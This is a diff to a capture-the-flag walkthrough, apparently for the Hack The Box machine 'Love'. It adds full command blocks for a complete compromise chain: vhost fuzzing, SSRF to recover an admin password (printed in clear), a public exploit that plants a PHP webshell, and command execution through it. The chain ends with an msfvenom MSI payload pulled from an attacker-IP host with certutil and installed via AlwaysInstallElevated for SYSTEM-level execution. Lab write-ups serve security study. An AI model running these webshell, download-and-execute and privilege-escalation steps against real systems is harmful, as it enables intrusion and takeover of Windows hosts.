@@ -115,18 +115,82 @@ Root/admin access came from the machine's core misconfiguration or vulnerability
 
 ## 🧰 Command Palette
 
-<details>
-<summary><b>Useful commands and technique anchors</b></summary>
+<details open>
+<summary><b>🔎 Recon / VHosts</b></summary>
 
-- `ffuf vhost discovery for love.htb`
-- `curl scanner SSRF against staging/local URLs`
-- `searchsploit Voting System upload RCE`
-- `upload PHP webshell via authenticated admin panel`
-- `reg query HKCU/HKLM AlwaysInstallElevated`
-- `msfvenom -f msi windows/exec CMD=...`
-- `msiexec /quiet /qn /i C:\ProgramData\payload.msi`
+```bash
+sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt 10.129.48.103
+sudo nmap -sC -sV -Pn -p 80,443,445,3306,5000 -oN nmap_tcp.txt 10.129.48.103
+echo '10.129.48.103 love.htb staging.love.htb' | sudo tee -a /etc/hosts
+curl -i http://love.htb/
+curl -i http://staging.love.htb/
+ffuf -u http://10.129.48.103/ -H 'Host: FUZZ.love.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+```
 
 </details>
+
+<details open>
+<summary><b>🌐 SSRF via Free File Scanner</b></summary>
+
+```bash
+# Probe scanner behavior and internal surfaces
+curl -s 'http://staging.love.htb/beta.php' \
+  -d 'file=http://127.0.0.1:5000/'
+
+curl -s 'http://staging.love.htb/beta.php' \
+  -d 'file=http://love.htb/'
+
+# Recover admin credential from internal/staging content
+curl -s 'http://staging.love.htb/beta.php' \
+  -d 'file=http://127.0.0.1:5000/' | tee scanner_internal.html
+```
+
+</details>
+
+<details open>
+<summary><b>🗳️ Voting System Authenticated RCE</b></summary>
+
+```bash
+# Login with recovered admin password
+curl -i -c cookies.txt -b cookies.txt \
+  -d 'username=admin&password=@LoveIsInTheAir!!!!' \
+  http://love.htb/admin/login.php
+
+# Searchsploit helper
+searchsploit voting system upload
+searchsploit -m php/webapps/49445.py
+
+# Upload webshell through admin panel or exploit script
+python3 49445.py http://love.htb admin '@LoveIsInTheAir!!!!'
+
+# Command execution through uploaded shell
+curl -s 'http://love.htb/images/cmd.php?cmd=whoami'
+curl -s 'http://love.htb/images/cmd.php?cmd=type%20C:\Users\Phoebe\Desktop\user.txt'
+```
+
+</details>
+
+<details open>
+<summary><b>👑 AlwaysInstallElevated</b></summary>
+
+```bash
+# Confirm policy via webshell
+curl -s 'http://love.htb/images/cmd.php?cmd=reg%20query%20HKCU\Software\Policies\Microsoft\Windows\Installer%20/v%20AlwaysInstallElevated'
+curl -s 'http://love.htb/images/cmd.php?cmd=reg%20query%20HKLM\Software\Policies\Microsoft\Windows\Installer%20/v%20AlwaysInstallElevated'
+
+# Build MSI to copy root flag to readable location
+msfvenom -p windows/exec \
+  CMD='cmd.exe /c copy C:\Users\Administrator\Desktop\root.txt C:\ProgramData\root_flag.txt' \
+  -f msi -o copy_root.msi
+
+python3 -m http.server 8000
+curl -s 'http://love.htb/images/cmd.php?cmd=certutil%20-urlcache%20-f%20http://<attacker-ip>:8000/copy_root.msi%20C:\ProgramData\copy_root.msi'
+curl -s 'http://love.htb/images/cmd.php?cmd=msiexec%20/quiet%20/qn%20/i%20C:\ProgramData\copy_root.msi'
+curl -s 'http://love.htb/images/cmd.php?cmd=type%20C:\ProgramData\root_flag.txt'
+```
+
+</details>
+
 
 ---
 
